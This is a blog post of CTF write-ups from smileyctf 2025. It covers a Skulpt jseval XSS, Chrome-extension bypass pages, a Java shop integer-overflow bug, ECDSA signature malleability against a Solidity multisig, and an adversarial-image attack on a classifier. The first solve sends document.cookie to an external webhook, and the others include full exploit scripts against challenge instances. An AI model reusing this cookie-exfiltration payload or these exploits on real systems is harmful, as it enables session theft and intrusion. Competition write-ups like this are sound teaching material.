---
title: 'some smileyctf 2025 writeups'
description: 'some smileyctf 2025 writeups'
date: 2025-06-14
tags: ['web', 'ctf', 'writeup', 'blockchain', 'ai/ml']
image: './smiley.png'
authors: ['jp']
---

# Background Information
Hi, it's been a while since I wrote a ctf writeup. I participated in smileyctf w the cbf gang. So cool to see us mostly all back ctf'ing together after a brief hiatus period (7th place woo)!

## Web

### Sculpture Revenge

> client side python is cool. adapted from actf 2025 to require the harder solve.

Is skulpt, and is based on the amateurs ctf 2024 challenge scultpure. Well, we can use `jseval` to basically just execute javascript. Although, I had to adjust the payload a lil bit after I got local solve but no remote.

```python
import base64
import requests

url = "https://web-sculpture-revenge-h132e5cp.smiley.cat"
payload = """jseval(
  "var img=new Image();" +
  "img.src='https://webhook.site/7d869a27-659b-4af6-b635-76073cf50229/?'+document.cookie;"
)"""
# payload = """import unittest\njseval("alert(1)")"""
encoded = base64.b64encode(payload.encode()).decode()
print(encoded)
req = requests.get(f"{url}/bot?code={encoded}")
print(req.text)
```

And we get the flag: 

`.;,;.{we_love_cattle_no_flags_in_dist_trust_we_know_what_we_are_doing_yep}`

### Extension Mania

We have a website that allows us to serve html to http://coolctfgames.localhost:3000, and a bot that will access a url. 

The goal is that the website must stay on that link.

```js
if(currentUrl.host == config.host || currentUrl.host == config.host + ":" + config.port){
            console.log("Flag conditions met.");
            shouldGiveFlag = true;
        } else {
            // for your local debugging pleasure
            console.log("Bot did not reach the expected host:", currentUrl.host, pageUrl);
        }
```

But, there is an extension `sw.js` that essentially tries to exit out of the link

```js
async function tick(){
    const tabs = await queryAsync({});
    for(let tab of tabs){
        if(tab.url){
            const url = new URL(tab.url);
            if(url.hostname === "coolctfgames.localhost"){
                // student is off task =O =O =O
                console.log("Closing tab:", tab.url);
                await chrome.tabs.remove(tab.id);
                chrome.notifications.create("",{
                    type: "basic",
                    title: "Good Guardian",
                    message: "Tab was closed.",
                    priority: 2,
                });
            }
        }
    }
}
```

So the solution that I came to was to crash or make it difficult for the extension to exit out of the tab. (thanks claude lmao)

```python
import requests
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target configuration
TARGET = "https://web-extension-mania-p0ecf2s3.smiley.cat"  # Change to remote URL if needed
FLAG_HOST = "coolctfgames.localhost"
PORT = 3000

def exploit():
    # Final working exploit HTML
    exploit_html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
        <script>
        // Phase 1: Disable extensions
        try {{
            // Crash Good Guardian's tick function
            window.tick = () => {{
                while(true) {{ console.log('Extension neutralized'); }}
                return null;
            }};
            
            // Block extension communication
            window.chrome = undefined;
        }} catch(e) {{}}
        
        // Phase 2: Set correct URL after extensions are disabled
        setTimeout(() => {{
            history.replaceState({{}}, '', 'http://{FLAG_HOST}:{PORT}/');
            document.body.innerHTML = '<h1>Valid Page</h1><p>Ready for verification</p>';
        }}, 3000);
        </script>
    </head>
    <body>
        <h1>Loading...</h1>
    </body>
    </html>
    """
    
    print("[*] Updating page content...")
    try:
        requests.post(
            f"{TARGET}/update",
            data={"html": exploit_html},
            verify=False
        )
    except Exception as e:
        print(f"[-] Update failed: {str(e)}")
        return

    print(f"[*] Triggering bot with URL: http://{FLAG_HOST}:{PORT}")
    try:
        requests.post(
            f"{TARGET}/bot",
            data={"url": f"http://{FLAG_HOST}:{PORT}"},
            verify=False
        )
    except Exception as e:
        print(f"[-] Bot trigger failed: {str(e)}")
        return
    
    print("[+] Bot triggered successfully, waiting for execution...")
    time.sleep(50)  # Wait for bot completion
    
    print("[*] Checking bot status for flag...")
    try:
        response = requests.get(
            f"{TARGET}/bot/status",
            verify=False
        )
        
        # Handle both JSON and plain text responses
        try:
            data = response.json()
            if isinstance(data, str):
                print(f"[+] FLAG CAPTURED: {data}")
            else:
                print(f"[*] Bot status: {data}")
        except ValueError:
            # If not JSON, treat as plain text
            if ".;,;." in response.text:
                print(f"[+] FLAG CAPTURED: {response.text}")
            else:
                print(f"[*] Raw response: {response.text}")
    except Exception as e:
        print(f"[-] Status check failed: {str(e)}")

if __name__ == "__main__":
    exploit()
```

And you can reward yourself with a nice flag: 

`.;,;.{th3_d0wns1d3s_0f_3xt_ap1_abus3_and_r0ll1ng_y0ur_0wn_ur1_pars3rs}`

### Extension Mania Revenge

Essentially the same solve but I (claude) did more extreme methods in order to stop the extension from exiting the tab. 

```python
import requests
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target configuration
TARGET = "https://web-extension-mania-revenge-rftb7avs.smiley.cat"  # Change to remote URL if needed
FLAG_HOST = "coolctfgames.localhost"
PORT = 3000

def exploit():
    # New exploit approach: Since we can't fake the origin, we need to:
    # 1. Update the page with content that disables/crashes the extensions
    # 2. Make the bot visit the ACTUAL correct origin
    # 3. The page at the correct origin will use our custom HTML that prevents extension interference
    
    exploit_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Extension Bypass</title>
        <script>
        // Immediately try to interfere with extension execution
        (function() {
            // Override chrome APIs to prevent extension communication
            if (typeof chrome !== 'undefined') {
                try {
                    // Poison the chrome.tabs API
                    Object.defineProperty(window, 'chrome', {
                        get: function() {
                            return {
                                tabs: {
                                    query: function(info, callback) {
                                        // Return empty array to make extension think no tabs exist
                                        callback([]);
                                    },
                                    remove: function() {
                                        // Do nothing
                                        return Promise.resolve();
                                    }
                                },
                                runtime: {
                                    lastError: null,
                                    onStartup: {
                                        addListener: function() {}
                                    }
                                },
                                notifications: {
                                    create: function() {}
                                }
                            };
                        }
                    });
                } catch(e) {}
            }
            
            // Try to override the extension's tick function if it's exposed
            Object.defineProperty(window, 'tick', {
                value: async function() {
                    // Return immediately without doing anything
                    return;
                },
                writable: false,
                configurable: false
            });
            
            // Block any attempts to close the tab via beforeunload
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            });
            
            // Create a lot of noise to slow down extension execution
            for(let i = 0; i < 100; i++) {
                setTimeout(() => {
                    console.log('Keeping busy...');
                }, i * 10);
            }
        })();
        </script>
    </head>
    <body>
        <h1>CTF Challenge Page</h1>
        <p>This page is designed to stay open.</p>
        <button id="free-click">Click Me</button>
        
        <script>
        // Keep creating elements to potentially overwhelm the extension
        setInterval(() => {
            const div = document.createElement('div');
            div.style.display = 'none';
            document.body.appendChild(div);
        }, 1);
        
        // Continuously update the page to keep it "active"
        let counter = 0;
        setInterval(() => {
            document.title = 'Active Page ' + (counter++);
        }, 100);
        </script>
    </body>
    </html>
    """
    
    print("[*] Step 1: Updating page content with extension bypass...")
    try:
        response = requests.post(
            f"{TARGET}/update",
            data={"html": exploit_html},
            verify=False
        )
        print(f"[+] Update response: {response.text}")
    except Exception as e:
        print(f"[-] Update failed: {str(e)}")
        return

    # Wait a bit for the update to take effect
    time.sleep(2)
    
    # The key insight: We need to make the bot visit the ACTUAL correct origin
    # Since the server serves our custom HTML when the Host header matches FLAG_HOST,
    # the bot will load our exploit page when visiting the correct URL
    bot_url = f"http://{FLAG_HOST}:{PORT}/"
    
    print(f"[*] Step 2: Triggering bot with correct origin URL: {bot_url}")
    try:
        response = requests.post(
            f"{TARGET}/bot",
            data={"url": bot_url},
            verify=False
        )
        print(f"[+] Bot trigger response: {response.text}")
    except Exception as e:
        print(f"[-] Bot trigger failed: {str(e)}")
        return
    
    print("[*] Step 3: Waiting for bot execution (20 seconds)...")
    # The bot waits 15 seconds, plus some buffer time
    time.sleep(50)
    
    print("[*] Step 4: Checking bot status for flag...")
    max_attempts = 5
    for attempt in range(max_attempts):
        try:
            response = requests.get(
                f"{TARGET}/bot/status",
                verify=False
            )
            
            # Handle both JSON and plain text responses
            try:
                data = response.json()
                if isinstance(data, str) and ".;,;." in data):
                    print(f"\n[+] FLAG CAPTURED: {data}")
                    return
                else:
                    print(f"[*] Attempt {attempt + 1}/{max_attempts} - Status: {data}")
            except ValueError:
                # If not JSON, treat as plain text
                if  ".;,;." in response.text:
                    print(f"\n[+] FLAG CAPTURED: {response.text}")
                    return
                else:
                    print(f"[*] Attempt {attempt + 1}/{max_attempts} - Raw response: {response.text}")
            
            if attempt < max_attempts - 1:
                time.sleep(5)  # Wait before next attempt
                
        except Exception as e:
            print(f"[-] Status check failed: {str(e)}")
if __name__ == "__main__":
    exploit()

```

And get the flag: 

`.;,;.{th3_d0wns1d3s_0f_3xt_ap1_abus3_and_r0ll1ng_y0ur_0wn_ur1_pars3rs_and_try1ng_t0d0_0bscur3_chall_f0rmats_p1us_h3adl3ss_chr0m3_p1ta}`

### dry-ice-n-co

We come across a java springboot application, so let's do a little search for what we need to solve.

So looking at the code we see the requirements to get the flag in `ShopController.java`:

```java
private List<DryIceProduct> availableProducts = new ArrayList<>(Arrays.asList(
        new DryIceProduct("flag", 1000000, "you should buy one of these (if you can afford it)"),
        new DryIceProduct("Small Block", 16, "5kg block of dry ice, perfect for small coolers"),
        new DryIceProduct("Medium Block", 30, "10kg block of dry ice, ideal for medium-sized coolers"),
        new DryIceProduct("Large Block", 50, "20kg block of dry ice, great for large coolers"),
        new DryIceProduct("Pellet Pack", 20, "5kg of dry ice pellets, perfect for shipping")
    ));
```

So we have to somehow buy flag with price of 1000000. However in `ShoppingCart.java` we only have 100

```java
public ShoppingCart() {
        this.items = new ArrayList<>();
        this.balance = 100; // Initial balance of $100
        this.couponCode = null;
    }
```

So what to do? Thankfully there's a bunch of bugs that we can use to solve this challenge, in `ShopController.java` add-product route:

```java
 @PostMapping("/admin/add-product")
    public String addProduct(@RequestParam String name,
                           @RequestParam int price,
                           @RequestParam String description,
                           HttpSession session) {
        User user = (User) session.getAttribute("user");
        if ((user.admin = true) && user != null && name != "flag") {
            availableProducts.add(new DryIceProduct(name, price, description));
        }
        return "redirect:/";
    }
```

This is a common error in the if statement, that instead of assigning the `==` comparison operator, instead the user is being assigned as admin true, thereby making us able to add products.

So let's just assign a really big negative number and hopefully we can use that to help do something. Looking at `ShoppingCart.java`, we see a math.abs() call to the total, so let's use java's INTEGER.min_value, which is -2,147,483,648. This will cause the math.abs to kinda fuck up and do shit. 

```java
public int getTotal() {
        int total = items.stream()
                .mapToInt(CartItem::getTotal)
                .sum();
        total = Math.abs(total);
        
        ...
    
```

And we can see that there's a negative number in the product, and when we purchase it we get a negative balance. We can use the coupon SMILEICE to change the balance to positive. As shown in this code:

```java
if (isCouponValid()) {
            total = (int)(total * (100.0 - (double)DISCOUNT_PERCENTAGE) / 100.0);
        }
```

Since we get a "less negative" number than the INTEGER.min_value, I suppose the calculation won't fuck up. Also subtracting a negative number gives a positive number (i shud b a crypto main). 

Applying the coupon gives us a big balance, and we can easily purchase the flag:

`.;,;.{this_is_not_a_political_statement_btw}`

## Misc

### multisig-wallet

> This multisig wallet lets the owners distribute a shared fund of tokens. Distribute all the tokens in the wallet without the controllers' permission. do note - the rpc url says 0.0.0.0:8545 on the api, it is actually the second url we gave you for your instance

Ok so we are provided 2 smart contracts `Locker.sol` and `Setup.sol`. `Setup.sol` has super basic stuff so we can basically just ignore that until we write our exploit contract. Let's look into `Locker.sol`.

The `locker` contract sets up a contrusctor, which receives the lock id, 3 signatures (v, r, s), and 3 controller addresses. The constructor will check that we have at least 3 controllers, computes the expected message hash for lockId 0. Then calls `validateMultiSig()`

```solidity
constructor(
        uint256 _lockId,
        signature[] memory signatures,
        address[] memory _controllers,
        uint256 _threshold
    ) {
        require(
            _controllers.length >= _threshold && _threshold > 0,
            "Invalid config"
        );

        lockId = _lockId;
        threshold = _threshold;
        controllers = _controllers;
        tokens = 1;

        // Compute the expected hash
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, _lockId)
            _msgHash := keccak256(0x00, 0x3c)
        }
        msgHash = _msgHash;

        validateMultiSig(signatures);
```

`validateMultiSig()` will use `_isValidSignature` to recover the signer address using `ecrecover(msgHash, v, r, s)`, check if the signer is in the controllers list, creates a signature hash using `keccak256(abi.encode[r,s,v])`. It then ensures that there are no duplicate signers.

```solidity
 function _isValidSignature(
        signature memory sig
    ) internal returns (address) {
        uint8 v = sig.v;
        bytes32 r = sig.r;
        bytes32 s = sig.s;
        address _address = ecrecover(msgHash, v, r, s);
        require(_isInArray(_address, controllers), "Signer is not a controller");

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], "Signature has already been used");
        usedSignatures[signatureHash] = true;
        return _address;
    }
```

This is further supported in `validateMultiSig()`, which will ensure there are no duplicate signers and have exactly 3 valid signature.

Within the `Locker.sol` file is a contract `SetupLocker`, which 

The `isSolved()` function provides the necessary context on what we need to do to solve: Have the number of tokens be zero:

```solidity
function isSolved()  external view returns (bool) {
        return tokens == 0;
}
```

There is distribute function, which will allow us to subtract token by 1 if signatures pass `validateMultiSig()`. 

Looking at the constructor again, we know that we have `tokens=1`, so we need to call `distribute()` with valid signatures in order to reach the win condition of `tokens=0`. So how do we do that? The addresses and points are already used so we can't use those again...

The vulnerability is that the signature hash calculation `keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]))` creates a unique identifier for each signature, but ECDSA signatures can have two valid representations for the same signer and message.

I'm not really a crypto person, but TLDR for any valid signature (r,s), there exists (r, s') where s' = n - s.

Original: (v=27, r, s) uses point (r, y)
Malleable: (v=28, r, n-s) uses point (r, -y)

So we if we just calculate the other valid point, it will be able to pass even though it technically is a different signature! Let's create the `Exploit.s.sol`. I set this up in foundry, so you may want to understand how to set up foundry or to use a different web3 setup.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Locker, signature} from "../src/Locker.sol";
import {Setup} from "../src/Setup.sol";

contract Exploit is Script {
    
    uint256 privateKey = vm.envUint("PRIVATE_KEY");
    //replace w actual contract addr
    Locker locker = Locker("<CONTRACT ADDRESS HERE>");
    
    function run() public {
        vm.startBroadcast();

        console.log("Starting exploit...");
        console.log("Current tokens:", locker.tokens());
    
        
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141; // secp256k1 curve order
        
        signature[] memory malleableSignatures = new signature[](3);
        
        malleableSignatures[0] = signature({
            v: 28,
            r: 0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9,
            s: bytes32(n - uint256(0x6f326347e65ae8b25830beee7f3a4374f535a8f6eedb5221efba0f17eceea9a9))
        });
        
        
        malleableSignatures[1] = signature({
            v: 27,
            r: 0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7,
            s: bytes32(n - uint256(0x694430205a6b625cc8506e945208ad32bec94583bf4ec116598708f3b65e4910))
        });
        
        
        malleableSignatures[2] = signature({
            v: 28,
            r: 0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d,
            s: bytes32(n - uint256(0x6c0c845b7a88f5a2396d7f75b536ad577bbdb27ea8c03769a958b2a9d67117d2))
        });
        
        console.log("Calling distribute with malleable signatures...");
        locker.distribute(malleableSignatures);
        
        console.log("Tokens after exploit:", locker.tokens());
        console.log("Is solved:", locker.isSolved());
        
        vm.stopBroadcast();
    }
}
```

We then do:

```bash
forge script script/Exploit.s.sol --rpc-url https://misc-multisig-wallet-1y2sewxq.smiley.cat --broadcast --chain-id 31337 --legacy --private-key <YOUR PRIVATE KEY HERE>

== Logs ==
  Starting exploit...
  Current tokens: 1
  Calling distribute with malleable signatures...
  Tokens after exploit: 0
  Is solved: true
```
You should see in the output that we have successfully solved the challenge and then broadcast. 

Then on the blockchain "info" site, simply press get flag and you will get the flag: `.;,;.{sig_replay_kills_multisig}`

This was the first ever blockchain challenge I solved in a ctf! I only ever did ethernaut (+ claude crutch on this), but it was pretty cool trying to understand how this worked. Btw pls don't ask me questions abt this chall its legit blind leading the blind lmao.

### Project Holoswap

> After their graduation, .;,;. sealed away the souls of Gura and Amelia in an archive AI. Now, a glitch gives you one chance to spoof the system.
>
> “a... that's kinda sus...”

A pure claude endeavor. Solve script is rly long cus of claude (just write simple scripts bro)

```python
import base64
import io
import numpy as np
import os

# Suppress TensorFlow warnings
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf
tf.get_logger().setLevel('ERROR')

from PIL import Image
from tensorflow.keras.preprocessing.image import img_to_array

def load_verified_model():
    """Load the verified working model"""
    model = tf.keras.models.load_model('./verified_model.h5')
    return model

def load_image(img_path_or_pil):
    """Load and preprocess image EXACTLY like the server does"""
    if isinstance(img_path_or_pil, str):
        img = Image.open(img_path_or_pil)
    else:
        img = img_path_or_pil
    
    if img.mode == 'RGBA':
        img = img.convert('RGB')
    img = img_to_array(img.resize((96, 96)))
    img = img.astype('float32') / 255.0
    img = np.expand_dims(img, axis=0)
    return img

def calculate_l2_norm(image1, image2):
    """Calculate L2 norm EXACTLY like the server does"""
    return np.linalg.norm(image1.squeeze() - image2.squeeze())

def ultra_precise_attack(model, original_image, target_class=9):
    """
    Ultra-precise attack targeting L2 < 0.85 for safety margin
    """
    print(f"\n🎯 Ultra-Precise L2 Constrained Attack")
    print(f"Target: >99.9% confidence, L2 < 0.85 (safety margin)")
    
    # Multiple attempts with different parameters
    best_result = None
    best_score = 0.0
    
    configs = [
        # (learning_rate, l2_target, iterations, confidence_weight)
        (0.01, 0.80, 2000, 10.0),
        (0.005, 0.75, 2500, 15.0),
        (0.02, 0.82, 1500, 8.0),
        (0.008, 0.78, 3000, 12.0),
    ]
    
    for config_idx, (lr, l2_target, max_iter, conf_weight) in enumerate(configs):
        print(f"\n--- Config {config_idx+1}: LR={lr}, L2_target={l2_target}, Iter={max_iter} ---")
        
        adv_image = tf.Variable(original_image.copy(), dtype=tf.float32)
        
        # Warmup phase: build confidence
        print("Warmup phase...")
        for i in range(300):
            with tf.GradientTape() as tape:
                prediction = model(adv_image, training=False)
                target_prob = prediction[0][target_class]
                loss = -tf.math.log(target_prob + 1e-10)
            
            gradients = tape.gradient(loss, adv_image)
            if gradients is not None:
                adv_image.assign_sub(lr * 2.0 * gradients)
                adv_image.assign(tf.clip_by_value(adv_image, 0.0, 1.0))
        
        # Main optimization with strict L2 control
        print("Main optimization...")
        current_lr = lr
        
        for i in range(max_iter):
            with tf.GradientTape() as tape:
                prediction = model(adv_image, training=False)
                target_prob = prediction[0][target_class]
                
                # Confidence loss
                conf_loss = -tf.math.log(target_prob + 1e-12)
                
                # L2 penalty with steep increase near target
                current_l2 = tf.sqrt(tf.reduce_sum(tf.square(adv_image - original_image)))
                l2_excess = tf.maximum(0.0, current_l2 - l2_target)
                l2_penalty = tf.square(l2_excess) * (10.0 + i * 0.01)  # Increasing penalty
                
                # Combined loss
                loss = conf_loss * conf_weight + l2_penalty
            
            gradients = tape.gradient(loss, adv_image)
            
            if gradients is not None:
                # Adaptive learning rate
                if i % 200 == 0 and i > 0:
                    current_lr *= 0.95
                
                adv_image.assign_sub(current_lr * gradients)
                adv_image.assign(tf.clip_by_value(adv_image, 0.0, 1.0))
            
            # Progress check
            if i % 500 == 0:
                pred = model(adv_image, training=False).numpy()
                pred_class = np.argmax(pred)
                confidence = pred[0][target_class]
                l2_dist = calculate_l2_norm(adv_image.numpy(), original_image)
                
                print(f"  Iter {i}: Class={pred_class}, Conf={confidence:.6f}, L2={l2_dist:.4f}")
                
                # Early success check
                if pred_class == target_class and confidence > 0.999 and l2_dist < 0.85:
                    print(f"  ✅ Early success at iter {i}!")
                    break
        
        # Final evaluation for this config
        pred = model(adv_image, training=False).numpy()
        pred_class = np.argmax(pred)
        confidence = pred[0][target_class]
        l2_dist = calculate_l2_norm(adv_image.numpy(), original_image)
        
        print(f"Config {config_idx+1} final: Class={pred_class}, Conf={confidence:.6f}, L2={l2_dist:.4f}")
        
        # Scoring: heavily penalize L2 > 0.85, reward high confidence
        if pred_class == target_class and l2_dist < 0.85:
            score = confidence
        else:
            score = 0.0
        
        if score > best_score:
            best_score = score
            best_result = adv_image.numpy().copy()
            print(f"  🌟 New best! Score={score:.6f}")
    
    return best_result

def precision_fine_tune(model, initial_image, original_image, target_class=9):
    """
    Fine-tune to maximize precision within L2 constraint
    """
    print(f"\n🔧 Precision Fine-Tuning")
    
    adv_image = tf.Variable(initial_image.copy(), dtype=tf.float32)
    
    # Very conservative fine-tuning
    for i in range(1000):
        with tf.GradientTape() as tape:
            prediction = model(adv_image, training=False)
            target_prob = prediction[0][target_class]
            
            current_l2 = tf.sqrt(tf.reduce_sum(tf.square(adv_image - original_image)))
            
            # Only optimize confidence if L2 is safely below 0.8
            if current_l2 < 0.8:
                loss = -tf.math.log(target_prob + 1e-12)
            else:
                # Focus on reducing L2
                loss = tf.square(current_l2 - 0.75) * 100.0
        
        gradients = tape.gradient(loss, adv_image)
        
        if gradients is not None:
            # Very small learning rate for precision
            adv_image.assign_sub(0.001 * gradients)
            adv_image.assign(tf.clip_by_value(adv_image, 0.0, 1.0))
        
        if i % 200 == 0:
            pred = model(adv_image, training=False).numpy()
            pred_class = np.argmax(pred)
            confidence = pred[0][target_class]
            l2_dist = calculate_l2_norm(adv_image.numpy(), original_image)
            
            print(f"  Fine-tune {i}: Class={pred_class}, Conf={confidence:.6f}, L2={l2_dist:.4f}")
    
    return adv_image.numpy()

def server_simulation_test(adversarial_image, model, original_image):
    """Test with multiple server simulation variations"""
    print(f"\n🔍 Comprehensive Server Simulation")
    
    # Test 1: Direct numpy
    pred = model.predict(adversarial_image, verbose=0)
    pred_class = np.argmax(pred)
    confidence = pred[0][9]
    l2_dist = calculate_l2_norm(adversarial_image, original_image)
    
    print(f"Test 1 (Direct): Class={pred_class}, Conf={confidence:.6f}, L2={l2_dist:.6f}")
    
    # Test 2: PNG conversion (exact server path)
    img_array = (adversarial_image.squeeze() * 255).astype(np.uint8)
    pil_img = Image.fromarray(img_array)
    
    buffer = io.BytesIO()
    pil_img.save(buffer, format='PNG')
    base64_string = base64.b64encode(buffer.getvalue()).decode()
    
    # Reload exactly like server
    server_image = load_image(Image.open(io.BytesIO(base64.b64decode(base64_string))))
    server_pred = model.predict(server_image, verbose=0)
    server_class = np.argmax(server_pred)
    server_conf = server_pred[0][9]
    server_l2 = calculate_l2_norm(server_image, original_image)
    
    print(f"Test 2 (Server): Class={server_class}, Conf={server_conf:.6f}, L2={server_l2:.6f}")
    
    # Test 3: Different precision modes
    server_image_float64 = server_image.astype(np.float64)
    original_image_float64 = original_image.astype(np.float64)
    l2_float64 = np.linalg.norm(server_image_float64.squeeze() - original_image_float64.squeeze())
    
    print(f"Test 3 (Float64): L2={l2_float64:.6f}")
    
    # Success check with safety margin
    success = (server_class == 9 and server_conf > 0.999 and server_l2 < 0.9)
    
    if success:
        print(f"\n🎉 SERVER SIMULATION SUCCESS!")
        print(f"{'='*80}")
        print("SUBMIT THIS BASE64 STRING TO THE SERVER:")
        print(f"{'='*80}")
        print(base64_string)
        print(f"{'='*80}")
        
        with open('ULTRA_PRECISE_SOLUTION.txt', 'w') as f:
            f.write(base64_string)
        print("Solution saved to 'ULTRA_PRECISE_SOLUTION.txt'")
        
        return True, base64_string
    else:
        print(f"\n❌ Server simulation failed")
        print(f"Required: Class=9, Conf>0.999, L2<0.9")
        print(f"Achieved: Class={server_class}, Conf={server_conf:.6f}, L2={server_l2:.6f}")
        return False, base64_string

def main():
    print("🎯 ULTRA-PRECISE CTF SOLVER 🎯")
    print("="*50)
    
    # Load everything
    model = load_verified_model()
    original_image = load_image('./gura.png')
    
    # Verify original prediction
    orig_pred = model.predict(original_image, verbose=0)
    orig_class = np.argmax(orig_pred)
    print(f"Original prediction: Class {orig_class} (expected: 5)")
    
    if orig_class != 5:
        print("❌ Original prediction mismatch!")
        return
    
    # Ultra-precise attack
    result = ultra_precise_attack(model, original_image)
    
    if result is not None:
        # Fine-tune for maximum precision
        fine_tuned = precision_fine_tune(model, result, original_image)
        
        # Comprehensive server simulation
        success, base64_string = server_simulation_test(fine_tuned, model, original_image)
        
        if success:
            print(f"\n🎉 ULTRA-PRECISE SUCCESS!")
            return
        else:
            print(f"\n🔄 Trying original result without fine-tuning...")
            success, base64_string = server_simulation_test(result, model, original_image)
            
            if success:
                print(f"\n🎉 SUCCESS WITH ORIGINAL RESULT!")
                return
    
    print(f"\n💥 ULTRA-PRECISE ATTACK FAILED")
    print("The L2 constraint may be too restrictive for this model architecture.")

if __name__ == "__main__":
    main()
```

I'm not an ai/ml person nor do I really care abt it so I'll just leave it for u to analyze. Eventually after some time you get an image that passes the constraints of the server, and you can submit.

```python
from pwn import *

r = remote('smiley.cat',40353)

b64 = open('ULTRA_PRECISE_SOLUTION.txt').read().encode()

r.sendlineafter(b"Enter the base64 encoded image data:", b64)
print(r.recv())
r.interactive()
```

`.;,;.{Graduation_is_not_the_end_samekosaba_:eyes:}`

# Foreward

So happy to b back and ctf'ing w the crew! The crypto, pwn, rev ppl were super inspiring and the convos they were having were super complex ngl. I felt like I was in the kiddie table doing web + misc lmao. I think ngl we were expecting to get washed or b washed b4 the ctf, but it looks like we did pretty decent! Summer ctf grind begins!